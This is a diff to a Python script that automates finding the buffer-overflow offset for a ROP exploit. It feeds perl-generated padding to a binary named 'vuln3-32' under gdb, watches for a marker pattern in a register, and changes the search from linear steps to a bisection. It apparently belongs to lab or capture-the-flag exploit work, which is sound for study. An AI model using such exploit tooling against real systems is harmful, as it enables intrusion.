@@ -78,11 +78,21 @@ for line in rop.stdout:
 
 pp.pprint(rop_gadgets)
 
-padding = 0
+padding = 8
+lowest = 0
+highest = float('inf')
 found = False
+too_much = False
 
 while True:
-    os.system('perl -e \'print "A"x{}, "DCBA"\' > input'.format(padding))
+    # if we get stuck
+    # happens when current padding is more than needed, but our pattern "DCBA" 
+    # hasn't been found and we know the highest result that results in "FFFF" pattern
+    if lowest + 1 == highest:
+        padding -= 3
+
+    too_much = False
+    os.system('perl -e \'print "F"x{}, "DCBA"\' > input'.format(padding))
     gdb = subprocess.Popen(["gdb", "vuln3-32"],
                             stdin =subprocess.PIPE,
                             stdout=subprocess.PIPE,
@@ -101,10 +111,19 @@ while True:
             if line.split(' ')[0][2:] == '41424344':
                 print("FOUND PADDING:", padding, "\n")
                 found = True
-                
+            if line.split(' ')[0][2:] == '46464646': # too much padding, go lower
+                if highest > padding:
+                    highest = padding
+                padding = (lowest + highest) // 2
+                print('pad: ', padding, '\n')
+                too_much = True
     if found:
         break
-    padding += 4
+    if not too_much:
+        if lowest < padding:
+            lowest = padding
+            padding *= 2
+    print('l: ', lowest, ' h: ', highest,'\n')
     print('pad: ', padding, '\n')
 
 STACKADDR = int(rop_gadgets['stackAddr'][0], 0)
